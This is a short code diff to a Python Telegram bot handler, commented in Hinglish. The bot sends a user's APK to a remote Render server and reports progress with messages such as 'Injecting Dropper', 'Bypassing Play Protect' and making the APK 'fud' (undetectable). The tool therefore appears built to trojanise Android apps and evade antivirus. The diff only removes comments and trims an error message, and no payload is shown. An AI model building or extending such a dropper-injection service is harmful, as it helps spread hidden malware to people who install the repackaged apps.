@@ -56,7 +56,6 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await progress_msg.edit_text("⏳ [■■■□□□□□□□] 30%\n**Injecting Dropper...**\nServer pe download ho raha hai...", parse_mode='Markdown')
         await progress_msg.edit_text("⏳ [■■■■■□□□□□] 50%\n**Bypassing Play Protect...**\nAPK fud kar raha hai (Thoda time lagta hai)...", parse_mode='Markdown')
         
-        # Timeout 300 seconds (5 mins) taaki Render ko apktool chalane ka time mile
         response = requests.post(RENDER_URL, json={"apk_url": file_url}, timeout=300)
 
         if response.status_code == 200:
@@ -78,14 +77,12 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
             await progress_msg.delete()
         else:
-            # Render ka asli error nikaal raha hai
             try:
                 error_data = response.json()
                 error_msg = error_data.get("error", response.text)
             except:
                 error_msg = response.text
             
-            # Agar error bahut lamba hai toh cut kar de
             if len(error_msg) > 200:
                 error_msg = error_msg[:200] + "..."
 
@@ -95,7 +92,7 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
             
     except requests.exceptions.Timeout:
-        await progress_msg.edit_text("❌ **Timeout Error!**\nRender server ne 5 minute me jawab nahi diya. (Maybe RAM full ho gayi).")
+        await progress_msg.edit_text("❌ **Timeout Error!**\nRender server ne 5 minute me jawab nahi diya.")
     except Exception as e:
         await progress_msg.edit_text(f"❌ **Error aaya:**\n`{str(e)}`", parse_mode='Markdown')
 
